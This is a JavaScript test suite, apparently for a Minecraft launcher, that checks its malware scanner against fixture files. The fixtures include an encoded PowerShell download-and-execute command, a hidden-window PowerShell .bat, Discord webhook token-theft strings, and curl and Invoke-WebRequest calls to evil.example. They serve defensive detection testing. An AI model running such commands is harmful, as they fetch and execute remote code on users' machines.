/**
 * Bộ kiểm thử lõi Zeko — chạy bằng `npm test` (node:test, không cần framework).
 * Tập trung vào Sentinel và Turbo vì đây là hai phần có logic thật.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import { buildZip } from '../lib/zipwrite.js';
import { ZipReader, entropy } from '../lib/zip.js';
import { scanFile, scanDirectory, buildManifest, verifyAgainstManifest } from '../lib/scanner.js';
import * as Quarantine from '../lib/quarantine.js';
import { getPresets, recommend } from '../lib/performance.js';
import { requiredJava } from '../lib/java.js';
import { quickBenchmark, tierFor, profileFor } from '../lib/metrics.js';

/** Chuỗi -EncodedCommand thật (base64 UTF-16LE) để kiểm thử chữ ký ZEKO-SIG-0005. */
const ENC = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUvAHgAJwApAA==';

let tmp;
test.before(async () => {
  tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'zeko-test-'));
  process.env.ZEKO_ROOT = path.join(tmp, 'root');
});
test.after(async () => {
  await fs.rm(tmp, { recursive: true, force: true });
});

/* ── ZIP reader/writer ─────────────────────────────────────────── */
test('zip: ghi rồi đọc lại đúng tên và nội dung', async () => {
  const file = path.join(tmp, 'a.zip');
  await buildZip(file, [
    { name: 'pack.mcmeta', data: '{"pack":{}}' },
    { name: 'assets/minecraft/lang/vi_vn.json', data: '{"block":"Khối"}' },
  ]);
  const zip = await ZipReader.open(file);
  const names = zip.entries.map((e) => e.name).sort();
  assert.deepEqual(names, ['assets/minecraft/lang/vi_vn.json', 'pack.mcmeta']);
  const entry = zip.entries.find((e) => e.name === 'pack.mcmeta');
  const content = await zip.readEntry(entry);
  assert.equal(content.toString('utf8'), '{"pack":{}}');
  await zip.close();
});

test('zip: entropy của dữ liệu lặp lại thấp, của dữ liệu ngẫu nhiên cao', () => {
  const flat = Buffer.alloc(4096, 0x41);
  const rnd = Buffer.from(Array.from({ length: 4096 }, () => Math.floor(Math.random() * 256)));
  assert.ok(entropy(flat) < 0.2, 'dữ liệu đồng nhất phải có entropy gần 0');
  assert.ok(entropy(rnd) > 7.5, 'dữ liệu ngẫu nhiên phải có entropy cao');
});

/* ── Sentinel: phát hiện ───────────────────────────────────────── */
test('sentinel: pack sạch có điểm rủi ro 0 và verdict clean', async () => {
  const file = path.join(tmp, 'clean.zip');
  await buildZip(file, [
    { name: 'pack.mcmeta', data: '{"pack":{"pack_format":15,"description":"Clean"}}' },
    { name: 'pack.png', data: Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex') },
    { name: 'assets/minecraft/lang/vi_vn.json', data: '{"block.minecraft.stone":"Đá"}' },
  ]);
  const f = await scanFile(file);
  assert.equal(f.verdict, 'clean', JSON.stringify(f.reasons));
  assert.ok(f.score < 25, `điểm phải < 25, thực tế ${f.score}`);
});

test('sentinel: pack chứa .bat + powershell -enc bị đánh dấu threat', async () => {
  const file = path.join(tmp, 'trap.zip');
  await buildZip(file, [
    { name: 'pack.mcmeta', data: '{"pack":{"pack_format":15}}' },
    { name: 'install.bat', data: '@echo off\r\npowershell -nop -w hidden -enc " + ENC + "' },
  ]);
  const f = await scanFile(file);
  assert.equal(f.verdict, 'threat');
  const ids = f.reasons.map((r) => r.id);
  assert.ok(ids.includes('ZEKO-SIG-0006'), `phải bắt được tệp thực thi, có: ${ids}`);
});

test('sentinel: JAR giả mạo mod (không metadata, class rối tên, MZ, webhook)', async () => {
  const file = path.join(tmp, 'fake-mod.jar');
  await buildZip(file, [
    { name: 'a/b/Cd.class', data: 'cafebabeMZ\u0090\u0000discord_tokens https://discord.com/api/webhooks/1/abc' },
    { name: 'x/y/Ef.class', data: 'cafebabeURLClassLoader defineClass ProcessBuilder http://185.220.101.44/x' },
    ...Array.from({ length: 60 }, (_, i) => ({ name: `z/q/Q${i}.class`, data: 'cafebabe' + 'x'.repeat(120) })),
  ]);
  const f = await scanFile(file);
  assert.equal(f.verdict, 'threat');
  const ids = f.reasons.map((r) => r.id);
  assert.ok(ids.includes('ZEKO-HEUR-NOMETA'), `phải báo thiếu metadata mod: ${ids}`);
  assert.ok(ids.includes('ZEKO-HEUR-OBFUSC'), `phải báo class rối tên: ${ids}`);
});

test('sentinel: JAR mod hợp lệ (có fabric.mod.json) không bị báo thiếu metadata', async () => {
  const file = path.join(tmp, 'real-mod.jar');
  await buildZip(file, [
    { name: 'fabric.mod.json', data: '{"schemaVersion":1,"id":"testmod","name":"Test","version":"1.0.0"}' },
    ...Array.from({ length: 20 }, (_, i) => ({ name: `com/example/test/Class${i}.class`, data: 'cafebabe' + 'y'.repeat(80) })),
  ]);
  const f = await scanFile(file);
  assert.ok(!f.reasons.some((r) => r.id === 'ZEKO-HEUR-NOMETA'), 'không được báo thiếu metadata');
});

test('sentinel: tệp .bat đứng riêng bị bắt ngay theo tên', async () => {
  const file = path.join(tmp, 'installer.bat');
  await fs.writeFile(file, '@echo off\r\necho hello\r\n');
  const f = await scanFile(file);
  assert.ok(f.score >= 45, `phải >= 45, thực tế ${f.score}`);
  assert.ok(f.reasons.some((r) => r.id === 'ZEKO-SIG-0006'));
});

test('sentinel: function datapack gọi /execute run cmd bị bắt', async () => {
  const file = path.join(tmp, 'evil.mcfunction');
  await fs.writeFile(file, 'say hello\nexecute as @a run cmd /c curl http://evil.example/x\n');
  const f = await scanFile(file);
  assert.ok(f.reasons.some((r) => r.id === 'ZEKO-SIG-0001'), `phải bắt execute-run-cmd: ${JSON.stringify(f.reasons)}`);

  const file2 = path.join(tmp, 'evil2.mcfunction');
  await fs.writeFile(file2, '/execute @p ~ ~ ~ /rce\n');
  const f2 = await scanFile(file2);
  assert.ok(f2.reasons.some((r) => r.id === 'ZEKO-SIG-0001'), 'phải bắt /rce');
});

test('sentinel: file .jar không có magic PK bị coi là nguỵ trang', async () => {
  const file = path.join(tmp, 'fake.jar');
  await fs.writeFile(file, 'MZ' + '\u0090'.repeat(200));
  const f = await scanFile(file);
  assert.equal(f.verdict, 'threat');
  assert.ok(f.reasons.some((r) => r.id === 'ZEKO-HEUR-PE'));
});

/* ── Sentinel: quét thư mục + cách ly ──────────────────────────── */
test('sentinel: scanDirectory đếm đúng và cách ly khôi phục được', async () => {
  const root = path.join(tmp, 'inst');
  await fs.mkdir(path.join(root, 'mods'), { recursive: true });
  await fs.mkdir(path.join(root, 'resourcepacks'), { recursive: true });
  await fs.mkdir(path.join(root, 'screenshots'), { recursive: true });
  await fs.writeFile(path.join(root, 'screenshots', 'a.png'), 'x'.repeat(10)); // phải bị bỏ qua
  await fs.writeFile(path.join(root, 'mods', 'good.jar'), 'x');
  await buildZip(path.join(root, 'resourcepacks', 'trap.zip'), [
    { name: 'pack.mcmeta', data: '{"pack":{}}' },
    { name: 'run.ps1', data: 'Invoke-WebRequest http://evil.example' },
  ]);

  const report = await scanDirectory(root);
  assert.ok(report.counts.scanned >= 2, `phải quét ít nhất 2 tệp, thực tế ${report.counts.scanned}`);
  assert.equal(report.counts.threats, 1, 'chỉ pack độc bị coi là threat');
  assert.equal(report.results[0].file, 'resourcepacks/trap.zip');

  const rec = await Quarantine.quarantineFiles(root, ['resourcepacks/trap.zip'], { report });
  assert.equal(rec.counts.moved, 1);
  assert.equal(await fs.stat(path.join(root, 'resourcepacks', 'trap.zip')).then(() => 'còn', () => 'đã dời'), 'đã dời');

  const restored = await Quarantine.restoreBatch(rec.batch);
  assert.equal(restored.restored.length, 1);
  assert.ok(await fs.stat(path.join(root, 'resourcepacks', 'trap.zip')));
  await Quarantine.purgeBatch(rec.batch);
});

test('sentinel: manifest SHA-1 phát hiện tệp bị sửa', async () => {
  const root = path.join(tmp, 'baseline');
  await fs.mkdir(root, { recursive: true });
  await fs.writeFile(path.join(root, 'a.txt'), 'goc');
  await fs.writeFile(path.join(root, 'b.txt'), 'khong doi');
  const manifest = await buildManifest(root);
  assert.equal(manifest.length, 2);

  let res = await verifyAgainstManifest(root, manifest);
  assert.equal(res.tampered, false);
  assert.equal(res.ok, 2);

  await fs.writeFile(path.join(root, 'a.txt'), 'da bi sua');
  await fs.rm(path.join(root, 'b.txt'));
  res = await verifyAgainstManifest(root, manifest);
  assert.equal(res.tampered, true);
  assert.equal(res.bad.length, 1);
  assert.equal(res.bad[0].path, 'a.txt');
  assert.equal(res.missing.length, 1);
});

/* ── Turbo ─────────────────────────────────────────────────────── */
test('turbo: đủ 4 hồ sơ, mỗi hồ sơ có JVM args và gameSettings', async () => {
  const p = await getPresets();
  assert.equal(p.presets.length, 4);
  for (const preset of p.presets) {
    assert.ok(preset.jvmArgs.length > 5, `${preset.id} thiếu JVM args`);
    assert.ok(preset.gameSettings.renderDistance, `${preset.id} thiếu renderDistance`);
    assert.ok(preset.minRamMb <= preset.maxRamMb, `${preset.id} RAM vô lý`);
    assert.ok(preset.mods.every((m) => p.modCatalog[m]), `${preset.id} tham chiếu mod không tồn tại`);
  }
  const ids = p.presets.map((x) => x.id);
  assert.deepEqual(ids, ['potato', 'lowend', 'balanced', 'ultra']);
});

test('turbo: hồ sơ yếu dùng render distance thấp hơn hồ sơ mạnh', async () => {
  const p = await getPresets();
  const by = Object.fromEntries(p.presets.map((x) => [x.id, x]));
  assert.ok(by.potato.gameSettings.renderDistance < by.lowend.gameSettings.renderDistance);
  assert.ok(by.lowend.gameSettings.renderDistance < by.balanced.gameSettings.renderDistance);
  assert.ok(by.balanced.gameSettings.renderDistance < by.ultra.gameSettings.renderDistance);
  assert.equal(by.potato.jvmArgs[0], '-XX:+UseSerialGC');
  assert.ok(by.ultra.jvmArgs.includes('-XX:+UseZGC'));
});

test('turbo: recommend() luôn trả về hồ sơ hợp lệ', async () => {
  const rec = await recommend();
  assert.ok(['potato', 'lowend', 'balanced', 'ultra'].includes(rec.preset.id));
  assert.ok(rec.maxMb >= rec.minMb);
  assert.ok(rec.reason.length > 10);
});

test('turbo: chọn đúng Java theo phiên bản Minecraft', () => {
  assert.equal(requiredJava('1.21.4'), 21);
  assert.equal(requiredJava('1.20.5'), 21);
  assert.equal(requiredJava('1.20.4'), 17);
  assert.equal(requiredJava('1.18.2'), 17);
  assert.equal(requiredJava('1.17'), 17);
  assert.equal(requiredJava('1.16.5'), 8);
  assert.equal(requiredJava('1.8.9'), 8);
  assert.equal(requiredJava('1.12.2'), 8);
});

/* ── CSS: reset [hidden] ───────────────────────────────────────── */
test('css: reset [hidden] phải tồn tại với !important (chống lỗi backdrop phủ màn hình)', async () => {
  // Lỗi thật từng xảy ra: .modal-root/.playbar/.app đặt display (grid/flex)
  // nên đè lên display:none mặc định của thuộc tính hidden → modal backdrop
  // tối + hộp modal rỗng luôn phủ toàn giao diện. jsdom không mô hình hoá
  // cascade UA-vs-author nên phải kiểm tra trực tiếp văn bản CSS.
  const cssFile = path.resolve(path.dirname(new URL(import.meta.url).pathname), '..', '..', 'client', 'css', 'main.css');
  const css = await fs.readFile(cssFile, 'utf8');
  assert.ok(
    /\[hidden\]\s*{[^}]*display:\s*none\s*!important/.test(css),
    'main.css phải có luật `[hidden] { display: none !important; }`'
  );
});

/* ── Điểm chuẩn máy ────────────────────────────────────────────── */
test('benchmark: chạy được, cho điểm 0–1000 và đề xuất hồ sơ', async () => {
  const b = await quickBenchmark({ workDir: tmp });
  assert.ok(b.index >= 0 && b.index <= 1000, `index ngoài khoảng: ${b.index}`);
  assert.ok(b.tier.label);
  assert.ok(['potato', 'lowend', 'balanced', 'ultra'].includes(b.suggestedProfile));
  assert.ok(b.primeMs > 0 && b.allocMs > 0);
  assert.equal(tierFor(900).id, 'beast');
  assert.equal(tierFor(100).id, 'potato');
  assert.equal(profileFor(100, 3000, 2), 'potato');
  assert.equal(profileFor(900, 32000, 16), 'ultra');
});
